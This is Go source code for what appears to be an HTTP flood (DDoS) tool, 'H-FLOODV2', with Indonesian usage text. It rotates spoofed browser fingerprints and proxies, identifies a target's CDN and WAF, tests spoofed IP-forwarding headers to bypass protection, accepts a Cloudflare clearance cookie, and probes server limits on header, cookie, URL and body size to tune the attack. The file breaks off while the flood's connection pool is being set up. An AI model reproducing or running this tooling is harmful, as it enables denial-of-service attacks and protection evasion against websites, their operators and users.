package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	Reset       = "\033[0m"
	Red         = "\033[31m"
	Green       = "\033[32m"
	White       = "\033[37m"
	RedBright   = "\033[91m"
	RedLight    = "\033[38;5;203m"
	RedPink     = "\033[38;5;204m"
	LightPink   = "\033[38;5;218m"
	WhiteBright = "\033[97m"
	Speed       = 7500
	to          = 6 * time.Second
	KEP         = 30 * time.Second
)

type BPF struct {
	UA, Accept, Lang, Encoding, SecChUa, SecChUaMov, SecChUaPlat string
	SecFetchSite, SecFetchMode, SecFetchDest, Referer, Origin, DNT string
}

var PFS = []BPF{
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="144", "Google Chrome";v="144", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="143", "Google Chrome";v="143", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "macOS",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?1",
		SecChUaPlat:  "Android",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "1",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "1",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="145", "Microsoft Edge";v="145", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.bing.com/search?q=",
		Origin:       "https://www.bing.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      `"Chromium";v="144", "Opera";v="130", "Not?A_Brand";v="99"`,
		SecChUaMov:   "?0",
		SecChUaPlat:  "Windows",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "https://www.google.com",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "",
	},
	{
		UA:           "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
		Accept:       "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
		Lang:         "en-US,en;q=0.9",
		Encoding:     "gzip, deflate, br",
		SecChUa:      "",
		SecChUaMov:   "",
		SecChUaPlat:  "",
		SecFetchSite: "none",
		SecFetchMode: "navigate",
		SecFetchDest: "document",
		Referer:      "https://www.google.com/search?q=",
		Origin:       "",
		DNT:          "",
	},
}

var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}
var REF = []string{
	"https://www.google.com/search?q=",
	"https://www.bing.com/search?q=",
	"https://www.yahoo.com/search?p=",
	"https://www.duckduckgo.com/?q=",
}

type CLI struct {
	client *http.Client
	ip     string
}
type ProtectionInfo struct {
	CDN     string
	WAF     string
	Server  string
	Headers []string
}
type PREST struct {
	VOR, VUA, VRE, VPH, VME, VEN, VCC []string
}
type OriginProfile struct {
	Origin, Referer, SecFetchSite string
}

var CCK string
var ifModifiedSince = time.Now().AddDate(-1, 0, 0).Format(time.RFC1123)
var MaxHeaderCount, MaxCookieSize, MaxBodySize int

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

func RIP(rng *rand.Rand) string {
	return fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
}

func RST(rng *rand.Rand, length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rng.Intn(len(chars))]
	}
	return string(b)
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func doReq(target string, proxyURL string, req *http.Request) (*http.Response, error) {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	if proxyURL != "" {
		if proxy, err := url.Parse(proxyURL); err == nil {
			transport.Proxy = http.ProxyURL(proxy)
		}
	}
	client := &http.Client{
		Timeout:   7 * time.Second,
		Transport: transport,
	}
	return client.Do(req)
}

func PMP(target string) int {
	proxyURL := ""
	low, high := 1000, 2000
	for {
		testURL := target
		if strings.Contains(testURL, "?") {
			testURL += "&x=" + strings.Repeat("A", high)
		} else {
			testURL += "?x=" + strings.Repeat("A", high)
		}
		req, _ := http.NewRequest("GET", testURL, nil)
		resp, err := doReq(target, proxyURL, req)
		if err != nil || resp.StatusCode >= 400 {
			break
		}
		resp.Body.Close()
		low = high
		high *= 2
		if high > 200000 {
			break
		}
	}
	lastOK := low
	for low <= high {
		mid := (low + high) / 2
		testURL := target
		if strings.Contains(testURL, "?") {
			testURL += "&x=" + strings.Repeat("A", mid)
		} else {
			testURL += "?x=" + strings.Repeat("A", mid)
		}
		req, _ := http.NewRequest("GET", testURL, nil)
		resp, err := doReq(target, proxyURL, req)
		if err != nil {
			high = mid - 1
			continue
		}
		if resp.StatusCode < 400 {
			lastOK = mid
			low = mid + 1
		} else {
			high = mid - 1
		}
		resp.Body.Close()
	}
	if lastOK > 0 {
		testURL := target
		if strings.Contains(testURL, "?") {
			testURL += "&x=" + strings.Repeat("A", lastOK+1)
		} else {
			testURL += "?x=" + strings.Repeat("A", lastOK+1)
		}
		req, _ := http.NewRequest("GET", testURL, nil)
		resp, _ := doReq(target, proxyURL, req)
		if resp != nil && resp.StatusCode < 400 {
			lastOK++
		}
		if resp != nil {
			resp.Body.Close()
		}
	}
	return lastOK
}

func PMH(target string) int {
	proxyURL := ""
	low, high := 512, 1024
	for {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("X-Large-Data", strings.Repeat("A", high))
		resp, err := doReq(target, proxyURL, req)
		if err != nil || resp.StatusCode == 431 || resp.StatusCode == 400 || resp.StatusCode == 413 {
			break
		}
		resp.Body.Close()
		low = high
		high *= 2
		if high > 100000 {
			break
		}
	}
	lastOK := low
	for low <= high {
		mid := (low + high) / 2
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("X-Large-Data", strings.Repeat("A", mid))
		resp, err := doReq(target, proxyURL, req)
		if err != nil {
			high = mid - 1
			continue
		}
		if resp.StatusCode < 400 {
			lastOK = mid
			low = mid + 1
		} else {
			high = mid - 1
		}
		resp.Body.Close()
	}
	if lastOK > 0 {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("X-Large-Data", strings.Repeat("A", lastOK+1))
		resp, _ := doReq(target, proxyURL, req)
		if resp != nil && resp.StatusCode < 400 {
			lastOK++
		}
		if resp != nil {
			resp.Body.Close()
		}
	}
	return lastOK
}

func getGenericHeaders() []string {
	return []string{
		"X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Client-IP",
		"X-Forwarded-Host", "X-Host", "X-Proxy-Host", "X-Forwarded-Proto",
		"X-Request-ID", "X-Requested-With", "X-HTTP-Method-Override",
	}
}

func getBypassHeaders(cdn, waf string) []string {
	base := getGenericHeaders()
	specific := []string{}
	switch cdn {
	case "cloudflare":
		specific = append(specific, "CF-Connecting-IP", "CDN-Loop", "True-Client-IP")
	case "akamai":
		specific = append(specific, "X-Akamai-Transformed", "X-Original-Host")
	case "fastly":
		specific = append(specific, "Fastly-Client-IP", "X-Forwarded-Host")
	case "aws":
		specific = append(specific, "CloudFront-Forwarded-Proto", "X-Forwarded-Proto")
	case "imperva":
		specific = append(specific, "X-CDN", "X-Forwarded-For")
	case "sucuri":
		specific = append(specific, "X-Sucuri-ID")
	}
	switch waf {
	case "sucuri_waf":
		specific = append(specific, "X-Sucuri-ID")
	case "aws_waf":
		specific = append(specific, "X-Forwarded-Proto", "CloudFront-Forwarded-Proto")
	case "cloudflare_waf":
		specific = append(specific, "CF-Connecting-IP", "CDN-Loop")
	case "akamai_waf":
		specific = append(specific, "X-Akamai-Transformed")
	}
	all := append(base, specific...)
	seen := make(map[string]bool)
	unique := []string{}
	for _, h := range all {
		if !seen[h] {
			seen[h] = true
			unique = append(unique, h)
		}
	}
	return unique
}

func detectCDNFromHeaders(h http.Header) string {
	if h.Get("CF-Ray") != "" || h.Get("CF-Cache-Status") != "" || strings.Contains(h.Get("Server"), "cloudflare") {
		return "cloudflare"
	}
	if strings.Contains(h.Get("Server"), "Akamai") || h.Get("X-Akamai-Transformed") != "" {
		return "akamai"
	}
	if h.Get("X-Served-By") != "" || strings.Contains(h.Get("Via"), "Fastly") {
		return "fastly"
	}
	if strings.Contains(h.Get("Via"), "CloudFront") || h.Get("X-Amz-Cf-Id") != "" {
		return "aws"
	}
	if strings.Contains(h.Get("Server"), "Incapsula") || h.Get("X-CDN") == "Imperva" {
		return "imperva"
	}
	if h.Get("X-Sucuri-ID") != "" || strings.Contains(h.Get("Server"), "Sucuri") {
		return "sucuri"
	}
	return "unknown"
}

func detectWAFFromHeaders(h http.Header, status int) string {
	if h.Get("X-Sucuri-ID") != "" {
		return "sucuri_waf"
	}
	if h.Get("X-WAF") != "" || strings.Contains(h.Get("Server"), "ModSecurity") {
		return "modsecurity"
	}
	if h.Get("x-amzn-RequestId") != "" && status == 403 {
		return "aws_waf"
	}
	if h.Get("CF-Ray") != "" && (status == 403 || status == 503) {
		return "cloudflare_waf"
	}
	if strings.Contains(h.Get("Server"), "Akamai") && status == 403 {
		return "akamai_waf"
	}
	return "unknown"
}

func detectProtection(target string) ProtectionInfo {
	req, _ := http.NewRequest("GET", target, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0")
	resp, err := doReq(target, "", req)
	if err != nil || resp == nil {
		return ProtectionInfo{CDN: "unknown", WAF: "unknown", Server: "unknown", Headers: getGenericHeaders()}
	}
	defer resp.Body.Close()
	h := resp.Header
	info := ProtectionInfo{}
	info.Server = h.Get("Server")
	info.CDN = detectCDNFromHeaders(h)
	info.WAF = detectWAFFromHeaders(h, resp.StatusCode)
	info.Headers = getBypassHeaders(info.CDN, info.WAF)
	return info
}

func PHR(target string, ProxyX string, info ProtectionInfo) map[string]bool {
	parsedTarget, _ := url.Parse(target)
	targetHost := parsedTarget.Hostname()
	if ProxyX == "" {
		rng := rand.New(rand.NewSource(time.Now().UnixNano()))
		ProxyX = fmt.Sprintf("%d.%d.%d.%d", rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))
	}
	headersToTest := info.Headers
	extra := []string{"X-Original-URL", "X-Rewrite-URL", "X-Host-Override"}
	for _, h := range extra {
		if !contains(headersToTest, h) {
			headersToTest = append(headersToTest, h)
		}
	}
	result := make(map[string]bool)
	for _, h := range headersToTest {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		var val string
		switch h {
		case "X-Original-URL", "X-Rewrite-URL":
			val = "/" + RST(rand.New(rand.NewSource(time.Now().UnixNano())), 8)
		case "X-Forwarded-Host", "X-Proxy-Host", "X-Host", "X-Original-Host", "X-Host-Override":
			val = targetHost
		case "X-Request-ID":
			val = strconv.FormatInt(rand.Int63(), 16)
		case "CDN-Loop":
			val = "cloudflare"
		case "CF-Connecting-IP", "True-Client-IP", "X-Real-IP", "X-Originating-IP", "X-Client-IP", "Fastly-Client-IP":
			val = ProxyX
		case "X-Forwarded-Proto", "X-Forwarded-Scheme", "CloudFront-Forwarded-Proto":
			val = "https"
		case "X-Cache":
			val = "BYPASS"
		case "X-Requested-With":
			val = "XMLHttpRequest"
		case "X-HTTP-Method-Override", "X-Method-Override":
			val = "GET"
		case "X-Sucuri-ID":
			val = "sucuri-" + RST(rand.New(rand.NewSource(time.Now().UnixNano())), 8)
		case "X-Akamai-Transformed":
			val = "1"
		case "X-CDN":
			val = "Imperva"
		default:
			val = "test"
		}
		req.Header.Set(h, val)
		resp, err := doReq(target, "", req)
		if err != nil {
			result[h] = false
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			result[h] = true
		} else {
			result[h] = false
		}
	}
	return result
}

func HSUPPORT(target string) string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	conn, err := tls.Dial("tcp", net.JoinHostPort(host, "443"), &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2", "http/1.1"},
	})
	if err != nil {
		return "unknown"
	}
	defer conn.Close()
	proto := conn.ConnectionState().NegotiatedProtocol
	if proto == "h2" {
		return "H2"
	} else if proto == "http/1.1" {
		return "H1"
	}
	return "H3"
}

func ORIGIN(target string) []string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	candidates := []string{"https://" + host, "https://www.google.com", "https://www.bing.com", "https://www.yahoo.com", ""}
	valid := []string{}
	for _, origin := range candidates {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		if origin != "" {
			req.Header.Set("Origin", origin)
		}
		resp, err := doReq(target, "", req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, origin)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "https://"+host)
	}
	return valid
}

func UA_TEST(target string) []string {
	testUAs := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	}
	valid := []string{}
	for _, ua := range testUAs {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", ua)
		resp, err := doReq(target, "", req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, ua)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, testUAs[0])
	}
	return valid
}

func REFFERER(target string) []string {
	parsed, _ := url.Parse(target)
	host := parsed.Hostname()
	testReferers := []string{
		"https://" + host + "/",
		"https://www.google.com/search?q=" + host,
		"https://www.bing.com/search?q=" + host,
		"https://www.yahoo.com/search?p=" + host,
		"",
	}
	valid := []string{}
	for _, ref := range testReferers {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		if ref != "" {
			req.Header.Set("Referer", ref)
		}
		resp, err := doReq(target, "", req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, ref)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "https://"+host+"/")
	}
	return valid
}

func PPHEAD(target string, proxyIPs []string) []string {
	testIPs := []string{"127.0.0.1", "192.168.1.1", "10.0.0.1", "8.8.8.8"}
	for _, p := range proxyIPs {
		if p != "" {
			testIPs = append(testIPs, p)
		}
	}
	valid := []string{}
	for _, ip := range testIPs {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("X-Forwarded-For", ip)
		resp, err := doReq(target, "", req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, ip)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "127.0.0.1")
	}
	return valid
}

func HMETHOD(target string) []string {
	methods := []string{"GET", "POST", "OPTIONS", "HEAD", "PUT", "DELETE", "PATCH", "TRACE", "CONNECT"}
	valid := []string{}
	for _, method := range methods {
		req, _ := http.NewRequest(method, target, nil)
		if method == "POST" || method == "PUT" || method == "PATCH" {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			req.Body = io.NopCloser(strings.NewReader(""))
		}
		req.Header.Set("User-Agent", "Mozilla/5.0")
		resp, err := doReq(target, "", req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, method)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "GET")
	}
	return valid
}

func ENCOD(target string) []string {
	encodings := []string{"gzip, deflate, br", "gzip, deflate", "gzip", "br", "identity", "compress", "exi", "zstd"}
	valid := []string{}
	for _, enc := range encodings {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Accept-Encoding", enc)
		resp, err := doReq(target, "", req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, enc)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "gzip, deflate, br")
	}
	return valid
}

func CACH(target string) []string {
	controls := []string{"no-cache", "no-store", "max-age=0", "must-revalidate", "no-transform", "only-if-cached", "max-stale"}
	valid := []string{}
	for _, cc := range controls {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Cache-Control", cc)
		resp, err := doReq(target, "", req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
			valid = append(valid, cc)
		}
	}
	if len(valid) == 0 {
		valid = append(valid, "no-cache")
	}
	return valid
}

func probeHeaderCount(target string) int {
	proxyURL := ""
	low, high := 10, 20
	for {
		req, _ := http.NewRequest("GET", target, nil)
		for i := 0; i < high; i++ {
			req.Header.Set(fmt.Sprintf("X-Hdr-%d", i), "v")
		}
		resp, err := doReq(target, proxyURL, req)
		if err != nil || resp.StatusCode == 431 || resp.StatusCode == 400 {
			break
		}
		resp.Body.Close()
		low = high
		high *= 2
		if high > 500 {
			break
		}
	}
	lastOK := low
	for low <= high {
		mid := (low + high) / 2
		req, _ := http.NewRequest("GET", target, nil)
		for i := 0; i < mid; i++ {
			req.Header.Set(fmt.Sprintf("X-Hdr-%d", i), "v")
		}
		resp, err := doReq(target, proxyURL, req)
		if err != nil {
			high = mid - 1
			continue
		}
		if resp.StatusCode < 400 {
			lastOK = mid
			low = mid + 1
		} else {
			high = mid - 1
		}
		resp.Body.Close()
	}
	if lastOK > 0 {
		req, _ := http.NewRequest("GET", target, nil)
		for i := 0; i < lastOK+1; i++ {
			req.Header.Set(fmt.Sprintf("X-Hdr-%d", i), "v")
		}
		resp, _ := doReq(target, proxyURL, req)
		if resp != nil && resp.StatusCode < 400 {
			lastOK++
		}
		if resp != nil {
			resp.Body.Close()
		}
	}
	return lastOK
}

func probeCookieSize(target string) int {
	proxyURL := ""
	low, high := 512, 1024
	for {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("Cookie", "a="+strings.Repeat("A", high))
		resp, err := doReq(target, proxyURL, req)
		if err != nil || resp.StatusCode == 431 || resp.StatusCode == 400 || resp.StatusCode == 413 {
			break
		}
		resp.Body.Close()
		low = high
		high *= 2
		if high > 50000 {
			break
		}
	}
	lastOK := low
	for low <= high {
		mid := (low + high) / 2
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("Cookie", "a="+strings.Repeat("A", mid))
		resp, err := doReq(target, proxyURL, req)
		if err != nil {
			high = mid - 1
			continue
		}
		if resp.StatusCode < 400 {
			lastOK = mid
			low = mid + 1
		} else {
			high = mid - 1
		}
		resp.Body.Close()
	}
	if lastOK > 0 {
		req, _ := http.NewRequest("GET", target, nil)
		req.Header.Set("Cookie", "a="+strings.Repeat("A", lastOK+1))
		resp, _ := doReq(target, proxyURL, req)
		if resp != nil && resp.StatusCode < 400 {
			lastOK++
		}
		if resp != nil {
			resp.Body.Close()
		}
	}
	return lastOK
}

func probeBodySize(target string) int {
	proxyURL := ""
	low, high := 1024, 2048
	for {
		body := strings.NewReader(strings.Repeat("B", high))
		req, _ := http.NewRequest("POST", target, body)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err := doReq(target, proxyURL, req)
		if err != nil || resp.StatusCode == 413 || resp.StatusCode == 400 {
			break
		}
		resp.Body.Close()
		low = high
		high *= 2
		if high > 1000000 {
			break
		}
	}
	lastOK := low
	for low <= high {
		mid := (low + high) / 2
		body := strings.NewReader(strings.Repeat("B", mid))
		req, _ := http.NewRequest("POST", target, body)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err := doReq(target, proxyURL, req)
		if err != nil {
			high = mid - 1
			continue
		}
		if resp.StatusCode < 400 {
			lastOK = mid
			low = mid + 1
		} else {
			high = mid - 1
		}
		resp.Body.Close()
	}
	if lastOK > 0 {
		body := strings.NewReader(strings.Repeat("B", lastOK+1))
		req, _ := http.NewRequest("POST", target, body)
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, _ := doReq(target, proxyURL, req)
		if resp != nil && resp.StatusCode < 400 {
			lastOK++
		}
		if resp != nil {
			resp.Body.Close()
		}
	}
	return lastOK
}

func GetProfileForOrigin(origin string, host string) OriginProfile {
	switch origin {
	case "https://" + host:
		return OriginProfile{origin, "https://" + host + "/", "same-origin"}
	case "https://www.google.com":
		return OriginProfile{origin, "https://www.google.com/search?q=" + host, "cross-site"}
	case "https://www.bing.com":
		return OriginProfile{origin, "https://www.bing.com/search?q=" + host, "cross-site"}
	case "https://www.yahoo.com":
		return OriginProfile{origin, "https://www.yahoo.com/search?p=" + host, "cross-site"}
	default:
		return OriginProfile{"", "", "cross-site"}
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Cara pakai: H-FLOODV2.go <target> <duration> <cookie>")
		fmt.Println("Contoh: H-FLOODV2.go https://target.com 60 \"cf_clearance=xxx\"")
		os.Exit(1)
	}
	tgt := os.Args[1]
	dur := 0
	if len(os.Args) >= 3 {
		if d, err := strconv.Atoi(os.Args[2]); err == nil && d > 0 {
			dur = d
		}
	}
	if len(os.Args) >= 4 {
		CCK = os.Args[3]
	}
	parsed, _ := url.Parse(tgt)
	host := parsed.Hostname()
	if strings.HasPrefix(host, "www.") {
		host = host[4:]
	}
	var PRX []*url.URL
	file, err := os.Open("proxy.txt")
	if err == nil {
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line == "" {
				continue
			}
			if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}
			if p, err := url.Parse(line); err == nil {
				PRX = append(PRX, p)
			}
		}
	}
	if len(PRX) == 0 {
		PRX = append(PRX, nil)
	}
	var ProxyX string
	var proxyIPs []string
	for _, p := range PRX {
		if p != nil {
			proxyIPs = append(proxyIPs, p.Hostname())
		}
	}
	if len(proxyIPs) > 0 {
		ProxyX = proxyIPs[0]
	}

	fmt.Printf("%s▶ Proses Bypass!%s\n", Green, Reset)

	protection := detectProtection(tgt)
	fmt.Printf("  CDN    : %s\n", protection.CDN)
	fmt.Printf("  WAF    : %s\n", protection.WAF)
	fmt.Printf("  Server : %s\n", protection.Server)

	type probeResults struct {
		maxP, maxHead int
		supported     map[string]bool
		httpVersion   string
		vor, vuas, vref, vips, vmet, ven, vcac []string
		maxHeaderCount, maxCookieSize, maxBodySize int
	}
	var res probeResults
	var wgProbe sync.WaitGroup
	runProbe := func(fn func()) { wgProbe.Add(1); go func() { defer wgProbe.Done(); fn() }() }

	runProbe(func() { res.maxP = PMP(tgt) })
	runProbe(func() { res.maxHead = PMH(tgt) })
	runProbe(func() { res.supported = PHR(tgt, ProxyX, protection) })
	runProbe(func() { res.httpVersion = HSUPPORT(tgt) })
	runProbe(func() { res.vor = ORIGIN(tgt) })
	runProbe(func() { res.vuas = UA_TEST(tgt) })
	runProbe(func() { res.vref = REFFERER(tgt) })
	runProbe(func() { res.vips = PPHEAD(tgt, proxyIPs) })
	runProbe(func() { res.vmet = HMETHOD(tgt) })
	runProbe(func() { res.ven = ENCOD(tgt) })
	runProbe(func() { res.vcac = CACH(tgt) })
	runProbe(func() { res.maxHeaderCount = probeHeaderCount(tgt) })
	runProbe(func() { res.maxCookieSize = probeCookieSize(tgt) })
	runProbe(func() { res.maxBodySize = probeBodySize(tgt) })
	wgProbe.Wait()

	MaxP, MaxHead := res.maxP, res.maxHead
	Supported := res.supported
	httpVersion := res.httpVersion
	VORI, VUAS, VREF, VIPS, VMET, VENC, VCAC := res.vor, res.vuas, res.vref, res.vips, res.vmet, res.ven, res.vcac
	MaxHeaderCount, MaxCookieSize, MaxBodySize = res.maxHeaderCount, res.maxCookieSize, res.maxBodySize

	fmt.Printf("%s▶ Batas Tambahan:%s\n", Green, Reset)
	fmt.Printf("  Max Header Count   : %d\n", MaxHeaderCount)
	fmt.Printf("  Max Cookie Size    : %d\n", MaxCookieSize)
	fmt.Printf("  Max Body Size      : %d\n", MaxBodySize)

	wcs := make([]CLI, len(PRX))
	for i, ProxyY := range PRX {
		tr := &http.Transport{
			DialContext: (&net.Dialer{Timeout: 4 * time.Second, KeepAlive: KEP}).DialContext,
			DisableKeepAlives:      false,
			DisableCompression:     false,
			MaxIdleConns:           10000,
			MaxIdleConnsPerHost:    5000,
			MaxConnsPerHost:        0,
